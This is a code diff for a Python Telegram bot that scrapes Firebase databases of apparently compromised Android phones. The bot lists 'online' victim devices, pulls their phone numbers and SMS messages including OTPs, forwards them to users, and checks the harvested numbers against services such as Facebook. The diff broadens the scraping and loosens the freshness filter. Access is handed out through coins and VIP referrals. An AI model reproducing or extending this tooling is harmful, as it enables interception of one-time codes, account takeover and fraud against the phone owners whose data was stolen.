@@ -349,7 +349,6 @@ def load_data():
                     SYS_SETTINGS.update(data["SYS_SETTINGS"])
         except: pass
     
-    # Ensure root admin is always present
     if 6860106371 not in SYS_SETTINGS.setdefault("admins", [6860106371]):
         SYS_SETTINGS["admins"].append(6860106371)
 
@@ -360,7 +359,7 @@ async def auto_save_loop():
 
 async def auto_backup_loop(app: Application):
     while True:
-        await asyncio.sleep(3 * 3600)  # 3 Hours Delay
+        await asyncio.sleep(3 * 3600)  
         total_users = len(all_users)
         custom_db_users = sum(1 for u in all_users.values() if u.get("personal_dbs"))
         total_otps = sum(u.get("otp_count", 0) for u in all_users.values())
@@ -392,7 +391,6 @@ def tlog(msg: str) -> None:
     print(f"[{datetime.now().strftime('%I:%M:%S %p')}]  {msg}", flush=True)
 
 def is_root_admin(user_id: int) -> bool:
-    """Checks if the user is in the dynamic admin list."""
     return user_id in SYS_SETTINGS.get("admins", [6860106371])
 
 def is_spamming(user_id: int) -> bool:
@@ -449,15 +447,38 @@ def parse_battery(val) -> int:
         return int(digits) if digits else 0
     return 0
 
-def is_recently_active(ts) -> bool:
-    """Strictly checks if timestamp is from the last 6 hours (21600 seconds) to avoid stale 'yesterday' numbers."""
-    if not ts: return False
-    now = time.time()
+# 🔥 FIXED: Safe Timestamp parser so bot doesn't crash on bad database data
+def safe_ts(val) -> int:
     try:
-        ts = float(ts)
-        if ts > 1e11: ts = ts / 1000  # Convert ms to sec
-        return (now - ts) < 21600  # 6 Hours
+        if not val: return 0
+        val = float(val)
+        if val > 1e11: val = val / 1000
+        return int(val)
+    except: return 0
+
+# 🔥 FIXED: Freshness logic strictly ignores numbers older than 12 hours
+def is_recently_active(ts) -> bool:
+    try:
+        if not ts: return False
+        val = float(ts)
+        if val > 1e11: val = val / 1000  
+        now = time.time()
+        return (now - val) < 43200  # 12 Hours max
     except: return False
+
+def get_status(status_str, ts) -> str:
+    try:
+        if ts:
+            val = float(ts)
+            if val > 1e11: val = val / 1000
+            now = time.time()
+            if (now - val) < 43200: return "online"
+            else: return "offline"
+    except: pass
+    
+    if status_str is not None:
+        return "online" if str(status_str).lower() == "online" else "offline"
+    return "offline"
 
 def sms_date(sms: dict) -> str:
     date_str = sms.get("date") or sms.get("receivedDate") or sms.get("recivedDate")
@@ -610,7 +631,7 @@ async def check_number_api(service: str, number: str) -> dict:
     except Exception: return {"status": "error", "message": f"Timeout", "ms": int((time.time() - start_req) * 1000)}
 
 # ══════════════════════════════════════════════════════════════════
-#  FIREBASE DATA FETCHER - STRICT FRESHNESS ENGINE
+#  FIREBASE DATA FETCHER - VERY AGGRESSIVE
 # ══════════════════════════════════════════════════════════════════
 
 async def fetch_single_db(tag: str, url: str) -> Tuple[str, List[Device]]:
@@ -632,9 +653,7 @@ async def fetch_single_db(tag: str, url: str) -> Tuple[str, List[Device]]:
                     model = info.get("DeviceModel") or info.get("Brand") or f"Device-{dev_id[:6]}"
                     ts = info.get("currentTimeMillis") or info.get("timestamp") or sim.get("timestamp")
                     
-                    # 🔥 Strict Freshness Check
-                    status = "online" if is_recently_active(ts) else "offline"
-                    devices_list.append(Device(id=dev_id, name=model, status=status, battery=parse_battery(info.get("Battery")), timestamp=int(ts) if ts else 0, numbers=nums, device_info=f"Model: {model}\nDevice ID: {dev_id}", sms_path=f"All_Users/sms/{dev_id}", base_url=url, db_tag=tag))
+                    devices_list.append(Device(id=dev_id, name=model, status=get_status(info.get("Status") or sim.get("status"), ts), battery=parse_battery(info.get("Battery")), timestamp=safe_ts(ts), numbers=nums, device_info=f"Model: {model}\nDevice ID: {dev_id}", sms_path=f"All_Users/sms/{dev_id}", base_url=url, db_tag=tag))
 
             if isinstance(user_data_all, dict):
                 for dev_id, data in user_data_all.items():
@@ -643,8 +662,7 @@ async def fetch_single_db(tag: str, url: str) -> Tuple[str, List[Device]]:
                     nums = extract_all_nums(data)
                     ts = data.get("timestamp")
                     
-                    status = "online" if is_recently_active(ts) else "offline"
-                    devices_list.append(Device(id=dev_id, name=data.get("d_name") or f"Device-{dev_id[:6]}", status=status, battery=parse_battery(data.get("battery")), timestamp=int(ts) if ts else 0, numbers=nums, device_info=data.get("Device_info") or f"Device ID: {dev_id}", sms_path=f"user_sms/{dev_id}", base_url=url, db_tag=tag))
+                    devices_list.append(Device(id=dev_id, name=data.get("d_name") or f"Device-{dev_id[:6]}", status=get_status(data.get("status"), ts), battery=parse_battery(data.get("battery")), timestamp=safe_ts(ts), numbers=nums, device_info=data.get("Device_info") or f"Device ID: {dev_id}", sms_path=f"user_sms/{dev_id}", base_url=url, db_tag=tag))
 
             if isinstance(clients_all, dict):
                 for dev_id, client in clients_all.items():
@@ -654,7 +672,7 @@ async def fetch_single_db(tag: str, url: str) -> Tuple[str, List[Device]]:
                     if not nums and not client.get("modelName"): continue
                     added_set.add(dev_id)
                     model = client.get("modelName") or f"Device-{dev_id[:6]}"
-                    status = "online" if client.get("status") is True else "offline" # Clients use boolean
+                    status = "online" if client.get("status") is True else "offline"
                     
                     devices_list.append(Device(id=dev_id, name=model, status=status, battery=parse_battery(client.get("battery")), timestamp=0, numbers=nums, device_info=f"Model: {model}\nDevice ID: {dev_id}", sms_path=f"All_Users/sms/{dev_id}", base_url=url, db_tag=tag))
                     
@@ -665,8 +683,7 @@ async def fetch_single_db(tag: str, url: str) -> Tuple[str, List[Device]]:
                     nums = extract_all_nums(data)
                     model = data.get("model") or data.get("PhoneModel") or f"Device-{dev_id[:6]}"
                     ts = data.get("timestamp")
-                    status = "online" if is_recently_active(ts) else "offline"
-                    devices_list.append(Device(id=dev_id, name=model, status=status, battery=parse_battery(data.get("battery")), timestamp=int(ts) if ts else 0, numbers=nums, device_info=f"Model: {model}\nDevice ID: {dev_id}", sms_path=f"Devices/{dev_id}/sms", base_url=url, db_tag=tag))
+                    devices_list.append(Device(id=dev_id, name=model, status=get_status(data.get("status"), ts), battery=parse_battery(data.get("battery")), timestamp=safe_ts(ts), numbers=nums, device_info=f"Model: {model}\nDevice ID: {dev_id}", sms_path=f"Devices/{dev_id}/sms", base_url=url, db_tag=tag))
 
             if isinstance(users_all, dict):
                 for dev_id, data in users_all.items():
@@ -675,8 +692,7 @@ async def fetch_single_db(tag: str, url: str) -> Tuple[str, List[Device]]:
                     nums = extract_all_nums(data)
                     model = data.get("model") or data.get("name") or f"Device-{dev_id[:6]}"
                     ts = data.get("timestamp")
-                    status = "online" if is_recently_active(ts) else "offline"
-                    devices_list.append(Device(id=dev_id, name=model, status=status, battery=parse_battery(data.get("battery")), timestamp=int(ts) if ts else 0, numbers=nums, device_info=f"Model: {model}\nDevice ID: {dev_id}", sms_path=f"Users/{dev_id}/sms", base_url=url, db_tag=tag))
+                    devices_list.append(Device(id=dev_id, name=model, status=get_status(data.get("status"), ts), battery=parse_battery(data.get("battery")), timestamp=safe_ts(ts), numbers=nums, device_info=f"Model: {model}\nDevice ID: {dev_id}", sms_path=f"Users/{dev_id}/sms", base_url=url, db_tag=tag))
 
         except: pass
         return tag, devices_list
@@ -699,7 +715,6 @@ async def get_all_devices(bot_token: str) -> list[Device]:
             seen_numbers.update(new_nums)
         unique_devices.append(d)
 
-    # strictly active and fresh numbers
     online_devices = [d for d in unique_devices if d.status == "online"]
     online_devices.sort(key=lambda d: (0 if len(d.numbers) > 0 else 1, -d.timestamp))
     return online_devices
@@ -708,7 +723,7 @@ async def get_device_sms(device: Device, limit: int = SMS_LIMIT) -> list[dict]:
     data = await fb_get(device.sms_path, device.base_url)
     if not data: return []
     entries = [{"_key": k, **v} for k, v in data.items() if isinstance(v, dict)]
-    entries.sort(key=lambda s: int(s.get("timestamp") or 0), reverse=True)
+    entries.sort(key=lambda s: safe_ts(s.get("timestamp")), reverse=True)
     return entries[:limit]
 
 # ══════════════════════════════════════════════════════════════════
@@ -859,13 +874,6 @@ def get_vip_denied_keyboard(chat_id: int) -> InlineKeyboardMarkup:
 #  TELEGRAM COMMAND HANDLERS
 # ══════════════════════════════════════════════════════════════════
 
-async def send_bonus_if_applicable(ctx: ContextTypes.DEFAULT_TYPE, chat_id: int, users_db: dict, is_main_bot: bool):
-    if is_main_bot and not users_db.get(chat_id, {}).get("bonus_10_received"):
-        users_db.setdefault(chat_id, {})["bonus_10_received"] = True
-        users_db[chat_id]["coins"] = users_db[chat_id].get("coins", 0) + 10
-        try: await ctx.bot.send_message(chat_id, "🎉 <b>GIFT FROM ADMIN</b> 🎉\n\nAdmin ne aapko <b>10 Coins free</b> diye hain! 🎁\n\nAb sirf doston ko invite karo aur 1 Hour VIP ya khudka bot banao!\n\nClick '💸 Refer & Earn' to get your link.", parse_mode="HTML")
-        except: pass
-
 async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
     if update.effective_chat.type != "private": return
     chat_id, user, bot_token = update.effective_chat.id, update.effective_user, ctx.bot.token
@@ -908,7 +916,11 @@ async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
             try: await ctx.bot.send_message(ref_id, f"🎉 <b>SUCCESSFUL REFERRAL!</b>\n\nEk naye user ne aapke link se join kiya hai.\nCollect 15 referrals to get 1 Hour UNLIMITED VIP Access!\nYour Available Referrals: {avail}/15\n\n<i>⚠️ Note: Agar is user ne 24 ghante se pehle channel left kiya, toh dono ko penalty lagegi.</i>", parse_mode="HTML")
             except: pass
 
-    await send_bonus_if_applicable(ctx, chat_id, users_db, is_main_bot)
+    if is_main_bot and not users_db.get(chat_id, {}).get("bonus_10_received"):
+        users_db.setdefault(chat_id, {})["bonus_10_received"] = True
+        users_db[chat_id]["coins"] = users_db[chat_id].get("coins", 0) + 10
+        try: await ctx.bot.send_message(chat_id, "🎉 <b>GIFT FROM ADMIN</b> 🎉\n\nAdmin ne aapko <b>10 Coins free</b> diye hain! 🎁\n\nAb sirf doston ko invite karo aur 1 Hour VIP ya khudka bot banao!\n\nClick '💸 Refer & Earn' to get your link.", parse_mode="HTML")
+        except: pass
 
     unjoined = await check_membership(bot_token, ctx.bot, chat_id)
     if unjoined: return await send_join_prompt(update, is_main_bot)
@@ -1007,7 +1019,6 @@ async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
             pending_action[chat_id] = {"action": "check_number_input", "service": service}
             return await safe_edit(query, f"Send a 10 digit number to check on {service.capitalize()}:")
             
-        # 🔥 SMART AUTO-CHECKER (Loops, Shuffles & Skips)
         if data.startswith("auto_fb:") or data.startswith("my_fb:"):
             is_ok, msg = check_user_limit(chat_id)
             if not is_ok: return await safe_edit(query, msg, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🟢 Redeem 1H VIP (15 Refs)", callback_data="redeem_vip")], [InlineKeyboardButton("❌ Close", callback_data="close_msg")]]))
@@ -1024,10 +1035,8 @@ async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
                 devices = [d for r in results if isinstance(r, tuple) for d in r[1]]
             else:
                 await safe_edit(query, f"🔥 <b>SMART AUTO-CHECKER</b>\n━━━━━━━━━━━━━━━━━━\n📡 <i>Scanning databases for fresh numbers...</i>", parse_mode="HTML")
-                
                 unlocked = SYS_SETTINGS.get("unlocked_panels", [])
                 all_devs = [d for tag in GLOBAL_DEVICE_CACHE for d in GLOBAL_DEVICE_CACHE.get(tag, []) if is_admin or tag in unlocked or not tag.startswith("DB_")]
-                
                 unique_devices, seen_n = [], set()
                 for d in all_devs:
                     if d.numbers:
@@ -1042,9 +1051,7 @@ async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
             if not fresh_devices: 
                 return await safe_edit(query, "❌ No active online numbers found right now.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Close", callback_data="close_msg")]]))
             
-            # 🔥 Mix numbers so it's always random
             random.shuffle(fresh_devices)
-            
             seen_set = user_seen_unreg.setdefault(chat_id, set())
             if len(seen_set) > 50: seen_set.clear()
             
@@ -1053,12 +1060,9 @@ async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
             
             for idx, dev in enumerate(fresh_devices, 1):
                 target_num = dev.numbers[0]
-                
-                # 🔥 Skip numbers we already found unregistered
                 if target_num in seen_set: continue
                     
                 await safe_edit(query, f"🔥 <b>SMART AUTO-CHECKER</b>\n━━━━━━━━━━━━━━━━━━\n📡 Auto-Scanning... [{idx}/{total_scan}]\n📱 Checking: <code>+91{target_num[-10:]}</code>\n⚡ <i>Hitting {service.upper()} API...</i>", parse_mode="HTML")
-                
                 res = await check_number_api(service, target_num)
                 is_error = res.get("status") == "error"
                 if is_error: await asyncio.sleep(1.0); continue
@@ -1249,7 +1253,6 @@ async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
             dev_id = data[5:]
             all_devs = [d for tag in GLOBAL_DEVICE_CACHE for d in GLOBAL_DEVICE_CACHE.get(tag, [])]
             device = next((d for d in all_devs if d.id == dev_id), None)
-            
             if not device: return await query.answer("❌ Device not found!", show_alert=True)
             
             user_focus.setdefault(bot_token, {})[chat_id] = dev_id
@@ -1281,7 +1284,6 @@ async def on_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
     if unjoined: return await send_join_prompt(update, is_main_bot)
 
     if users_db.get(chat_id, {}).get("banned") or is_spamming(chat_id): return
-    await send_bonus_if_applicable(ctx, chat_id, users_db, is_main_bot)
 
     # 🔥 OWNER MANAGEMENT COMMANDS
     if is_root_admin(chat_id) and text.startswith("/addowner "):
@@ -1611,9 +1613,9 @@ async def _forward_sms(device: Device, sms: dict) -> None:
 async def fetch_single_db(tag: str, url: str) -> Tuple[str, List[Device]]:
     async with SCAN_SEMAPHORE:
         try:
-            sim_all, device_info_all, user_data_all, clients_all = await asyncio.gather(
+            sim_all, device_info_all, user_data_all, clients_all, devices_all, users_all = await asyncio.gather(
                 fb_get("All_Users/simDetails", url), fb_get("All_Users/Data/DeviceInfo", url),
-                fb_get("user_data", url), fb_get("clients", url), return_exceptions=True
+                fb_get("user_data", url), fb_get("clients", url), fb_get("Devices", url), fb_get("Users", url), return_exceptions=True
             )
 
             devices_list, added_set = [], set()
@@ -1628,8 +1630,7 @@ async def fetch_single_db(tag: str, url: str) -> Tuple[str, List[Device]]:
                     model = info.get("DeviceModel") or info.get("Brand") or f"Device-{dev_id[:6]}"
                     ts = info.get("currentTimeMillis") or info.get("timestamp") or sim.get("timestamp")
                     
-                    status = "online" if is_recently_active(ts) else "offline"
-                    devices_list.append(Device(id=dev_id, name=model, status=status, battery=parse_battery(info.get("Battery")), timestamp=int(ts) if ts else 0, numbers=nums, device_info=f"Model: {model}\nDevice ID: {dev_id}", sms_path=f"All_Users/sms/{dev_id}", base_url=url, db_tag=tag))
+                    devices_list.append(Device(id=dev_id, name=model, status=get_status(info.get("Status") or sim.get("status"), ts), battery=parse_battery(info.get("Battery")), timestamp=safe_ts(ts), numbers=nums, device_info=f"Model: {model}\nDevice ID: {dev_id}", sms_path=f"All_Users/sms/{dev_id}", base_url=url, db_tag=tag))
 
             if isinstance(user_data_all, dict):
                 for dev_id, data in user_data_all.items():
@@ -1637,8 +1638,8 @@ async def fetch_single_db(tag: str, url: str) -> Tuple[str, List[Device]]:
                     added_set.add(dev_id)
                     nums = extract_all_nums(data)
                     ts = data.get("timestamp")
-                    status = "online" if is_recently_active(ts) else "offline"
-                    devices_list.append(Device(id=dev_id, name=data.get("d_name") or f"Device-{dev_id[:6]}", status=status, battery=parse_battery(data.get("battery")), timestamp=int(ts) if ts else 0, numbers=nums, device_info=data.get("Device_info") or f"Device ID: {dev_id}", sms_path=f"user_sms/{dev_id}", base_url=url, db_tag=tag))
+                    
+                    devices_list.append(Device(id=dev_id, name=data.get("d_name") or f"Device-{dev_id[:6]}", status=get_status(data.get("status"), ts), battery=parse_battery(data.get("battery")), timestamp=safe_ts(ts), numbers=nums, device_info=data.get("Device_info") or f"Device ID: {dev_id}", sms_path=f"user_sms/{dev_id}", base_url=url, db_tag=tag))
 
             if isinstance(clients_all, dict):
                 for dev_id, client in clients_all.items():
@@ -1649,10 +1650,29 @@ async def fetch_single_db(tag: str, url: str) -> Tuple[str, List[Device]]:
                     added_set.add(dev_id)
                     model = client.get("modelName") or f"Device-{dev_id[:6]}"
                     status = "online" if client.get("status") is True else "offline"
+                    
                     devices_list.append(Device(id=dev_id, name=model, status=status, battery=parse_battery(client.get("battery")), timestamp=0, numbers=nums, device_info=f"Model: {model}\nDevice ID: {dev_id}", sms_path=f"All_Users/sms/{dev_id}", base_url=url, db_tag=tag))
-            
-            return tag, devices_list
-        except: return tag, []
+                    
+            if isinstance(devices_all, dict):
+                for dev_id, data in devices_all.items():
+                    if dev_id in added_set or not isinstance(data, dict): continue
+                    added_set.add(dev_id)
+                    nums = extract_all_nums(data)
+                    model = data.get("model") or data.get("PhoneModel") or f"Device-{dev_id[:6]}"
+                    ts = data.get("timestamp")
+                    devices_list.append(Device(id=dev_id, name=model, status=get_status(data.get("status"), ts), battery=parse_battery(data.get("battery")), timestamp=safe_ts(ts), numbers=nums, device_info=f"Model: {model}\nDevice ID: {dev_id}", sms_path=f"Devices/{dev_id}/sms", base_url=url, db_tag=tag))
+
+            if isinstance(users_all, dict):
+                for dev_id, data in users_all.items():
+                    if dev_id in added_set or not isinstance(data, dict): continue
+                    added_set.add(dev_id)
+                    nums = extract_all_nums(data)
+                    model = data.get("model") or data.get("name") or f"Device-{dev_id[:6]}"
+                    ts = data.get("timestamp")
+                    devices_list.append(Device(id=dev_id, name=model, status=get_status(data.get("status"), ts), battery=parse_battery(data.get("battery")), timestamp=safe_ts(ts), numbers=nums, device_info=f"Model: {model}\nDevice ID: {dev_id}", sms_path=f"Users/{dev_id}/sms", base_url=url, db_tag=tag))
+
+        except: pass
+        return tag, devices_list
 
 async def fetch_all_databases() -> Dict[str, List[Device]]:
     tasks = [fetch_single_db(tag, url) for tag, url in DATABASES.items()]
